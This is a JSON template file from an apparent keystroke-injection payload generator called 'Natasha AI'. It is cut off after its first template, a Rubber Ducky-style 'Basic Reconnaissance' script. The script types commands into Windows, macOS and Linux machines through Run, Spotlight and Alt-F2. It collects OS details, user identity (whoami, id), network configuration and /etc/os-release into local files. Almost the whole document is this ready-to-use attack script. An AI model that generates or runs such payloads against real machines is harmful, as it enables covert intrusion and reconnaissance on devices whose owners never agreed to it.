{
  "metadata": {
    "name": "Fallback Templates",
    "description": "Generic templates for when OS-specific ones are not available",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Basic Reconnaissance",
      "description": "Gather basic system information",
      "attack_type": "recon",
      "script": [
        "REM Basic Reconnaissance Script",
        "REM Generated by Natasha AI",
        "REM This script attempts to gather basic information across different OSes",
        "DELAY 1000",
        "REM Try Windows command prompt first",
        "GUI r",
        "DELAY 500",
        "STRING cmd",
        "ENTER",
        "DELAY 1000",
        "STRING echo OS Information: > %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo. >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo User Information: >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo. >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo Network Information: >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ipconfig /all >> %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo Information saved to %TEMP%\\system_info.txt",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try macOS Terminal next",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING sw_vers >> ~/Documents/natasha_data/system_info.txt 2>/dev/null || echo &quot;Not macOS&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/Documents/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ifconfig >> ~/Documents/natasha_data/system_info.txt 2>/dev/null || ip addr >> ~/Documents/natasha_data/system_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/system_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try Linux Terminal next",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;OS Information:&quot; > ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING uname -a >> ~/natasha_data/system_info.txt 2>/dev/null || echo &quot;Command failed&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING cat /etc/os-release >> ~/natasha_data/system_info.txt 2>/dev/null || echo &quot;File not found&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Information:&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nNetwork Information:&quot; >> ~/natasha_data/system_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ip addr >> ~/natasha_data/system_info.txt 2>/dev/null || ifconfig >> ~/natasha_data/system_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/system_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {}
    },
